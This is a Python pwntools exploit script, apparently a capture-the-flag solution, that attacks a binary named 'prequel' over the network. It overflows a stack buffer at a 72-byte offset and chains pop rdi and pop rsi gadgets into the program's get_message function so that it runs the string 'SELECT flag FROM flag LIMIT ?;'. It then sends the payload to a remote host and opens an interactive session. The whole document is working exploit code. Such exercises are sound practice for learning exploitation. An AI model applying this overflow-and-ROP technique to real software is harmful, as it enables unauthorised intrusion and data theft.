from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64, p32, u32
import sys

LOCAL_BIN = "./prequel"

if False:
    P = process(LOCAL_BIN)
    if True:
        gdb.attach(P.pid, """
b *main+118
display/i $pc
display/wx $rsp
c
""")
else:
    P = remote('10.10.1.12', 20882)

#P.sendline(cyclic(128))

offset = 72

ELF_LOADED = ELF(LOCAL_BIN)
ROP_LOADED = ROP(ELF_LOADED)
pop_rdi = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]
pop_rsi = (ROP_LOADED.find_gadget(['pop rsi', 'ret']))[0]
get_message = ELF_LOADED.symbols["get_message"]

select_flag = 0x5a10f8 # SELECT flag FROM flag LIMIT ?;
limit_number = 0x5a121b+20 # COMPILER=gcc-13.2.1 20230801

payload = b"A"*offset+p64(pop_rdi) + p64(select_flag)  + p64(pop_rsi) + p64(limit_number) + p64(get_message)

P.sendline(payload)
P.interactive()
